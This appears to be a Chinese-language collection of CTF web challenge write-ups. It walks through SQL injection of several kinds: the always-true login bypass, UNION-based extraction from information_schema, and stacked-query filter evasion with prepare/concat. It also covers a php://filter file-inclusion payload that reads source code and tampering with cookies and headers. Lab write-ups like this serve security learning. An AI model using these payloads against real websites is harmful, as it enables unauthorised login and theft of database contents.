# inget

![image-20230525134023179](CTF(WEB)image/image-20230525134023179.png) 

## 尝试进行 SQL注入

![image-20230525134128715](CTF(WEB)image/image-20230525134128715.png) 

尝试id=1没有回显

### 尝试使用万能密码登录

```mysql
## ?id=1' or 1=1 -- -
##构成的SQl语句
select * from table where id='1' or 1=1 -- - // or 1=1构造了一个永恒为真的语句,-- -是对后面的语句进行注释
## 此时将会输出表中的所有数据
```

![image-20230525134807666](CTF(WEB)image/image-20230525134807666.png) 

# fileinclude

![image-20230525141755204](CTF(WEB)image/image-20230525141755204.png) 

获取目标为flag.php

## 查看网页回应

![image-20230525141933849](CTF(WEB)image/image-20230525141933849.png) 

### 解析

1. 从 \$_COOKIE数组中获取language的值，并赋值给$lan变量
2. 如果 $lan 变量为空，就设置一个名为 language 的 cookie ，值为 english ，并且包含一个名为 english.php 的文件。
3. 否则，就包含一个以 $lan 变量的值加上 .php 后缀的文件。

## 方法

通过cookie传入文件包含的payload，读取flag.php的源码

```php
##通过php://协议的filter读取源码，read=指定base64的转换过滤器，flag进行base64编码。
php://filter/read=convert.base64-encode/resource=flag 
```

# Training-WWW-Robots

![image-20230616210613957](CTF(WEB)image/image-20230616210613957.png)

**翻译**：在这个小小的训练挑战中，你将学习机器人的排除标准。robots.txt文件用于网络爬虫检查它们是否被允许抓取和索引您的网站或仅部分网站。有时，这些文件揭示了目录结构，而不是保护内容不被抓取。

## 查看robots文件

![image-20230616210653859](CTF(WEB)image/image-20230616210653859.png) 

==发现其屏蔽了fl0g.php文件==

## 访问fl0g.php文件

![image-20230616210746150](CTF(WEB)image/image-20230616210746150.png) 

# xff_referer

![image-20230616212335717](CTF(WEB)image/image-20230616212335717.png)

## 通过heckBar插件修改

![image-20230616212837922](CTF(WEB)image/image-20230616212837922.png) 

![image-20230616213040311](CTF(WEB)image/image-20230616213040311.png)

![image-20230616213051555](CTF(WEB)image/image-20230616213051555.png) 

# [极客大挑战 2019]BuyFlag

## 使用BP拦截请求

![image-20230630205600373](CTF(WEB)image/image-20230630205600373.png)

### 修改cookie user=1

![image-20230630210720516](CTF(WEB)image/image-20230630210720516.png)

### 提示输入密码

查看注释发现需要输入传入两个参数

![image-20230630210815025](CTF(WEB)image/image-20230630210815025.png) 

### 使用POST传递第一个参数：password 不能为数字但是password为404

使用%20绕过

![image-20230630211520564](CTF(WEB)image/image-20230630211520564.png)

提示需要给钱

### 使用POST传递第二个参数：money=100000000

![image-20230630211719657](CTF(WEB)image/image-20230630211719657.png)

#### 提示参数过长，此时可以使用科学计数法绕过

![image-20230630211808524](CTF(WEB)image/image-20230630211808524.png)

# [强网杯 2019]随便注 1

![image-20230702182720009](CTF(WEB)image/image-20230702182720009.png)

## 测试是否存在SQL注入

### 1' or 1 = 1

![image-20230702182804495](CTF(WEB)image/image-20230702182804495.png)

**存在**

## 猜测列数

### **1' order by 2**

![image-20230702182951299](CTF(WEB)image/image-20230702182951299.png) 

### **1' order by 3**

![image-20230702183011766](CTF(WEB)image/image-20230702183011766.png) 

**列数为2**

## 使用联合注入

### 1' union select 1,2 #

![image-20230702183149496](CTF(WEB)image/image-20230702183149496.png) 

**返回被过滤的字符，可以知道/select|update|delete|drop|insert|where|\\./i"被过滤**

## 使用堆叠注入

### 1';show tables; #

![image-20230702183440887](CTF(WEB)image/image-20230702183440887.png) 

**此时发现两个数据表，1919810931114514，words**

### 1';show columns from \`1919810931114514`; #

![image-20230702183708795](CTF(WEB)image/image-20230702183708795.png) 

**发现flag字段，但是select被过滤，我们可以通过预编译的方式拼接select 关键字**

## 构造payload查询

### **1';prepare a from concat('s','elect', ' * from \`1919810931114514` ');EXECUTE a;#**

![image-20230702184146511](CTF(WEB)image/image-20230702184146511.png) 

**得到flag，flag{7176ff72-07ee-4c74-b968-0d7d0e259766}**

# [极客大挑战 2019]EasySQL1

![image-20231031002350202](CTF(WEB)image/image-20231031002350202.png) 

## 1、构造万能密码登录

payload：username=1'or '1'='1&password=1'or '1'='1

![image-20231031002819154](CTF(WEB)image/image-20231031002819154.png)





# [极客大挑战 2019]LoveSQL

![image-20231031234034761](CTF(WEB)image/image-20231031234034761.png) 

构造万能密码登录

username=1'or '1'='1&password=1'or '1'='1

拿到账号密码，说明存在SQL注入点

![image-20231031234157480](CTF(WEB)image/image-20231031234157480.png)

## 1、尝试sql注入

### 1.1 猜测列数

username=admin' order by 3 -- -&password=1

有会显说明列数是三列

![image-20231031235038316](CTF(WEB)image/image-20231031235038316.png)

猜测查询语句

### 1.2 联合注入

username=1'union select 1,2,3 -- -&password=1

![image-20231031235211155](CTF(WEB)image/image-20231031235211155.png) 

#### 1.2.1 查询数据库

username=1'union select 1,group_concat(database()),3 -- -&password=1

![image-20231031235719943](CTF(WEB)image/image-20231031235719943.png)

geek

#### 1.2.2 查询数据表

username=1'union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()-- -&password=1

![image-20231031235830073](CTF(WEB)image/image-20231031235830073.png)

geekuser , l0ve1ysq1

#### 1.2.3 查询字段

username=1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='geekuser'-- -&password=1

![image-20231101000929859](CTF(WEB)image/image-20231101000929859.png)

geekuser : id,username,password

username=1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='l0ve1ysq1'-- -&password=1

![image-20231101001112037](CTF(WEB)image/image-20231101001112037.png)

l0ve1ysq1: id,username,password

#### 1.2.4 查询数据表

username=1'union select 1,2,group_concat(username,password) from geekuser -- -&password=1

![image-20231101001306548](CTF(WEB)image/image-20231101001306548.png)

username=1'union select 1,2,group_concat(username,password) from l0ve1ysq1 -- -&password=1

![image-20231101001336630](CTF(WEB)image/image-20231101001336630.png)

拿到flag

![image-20231101001353423](CTF(WEB)image/image-20231101001353423.png) 

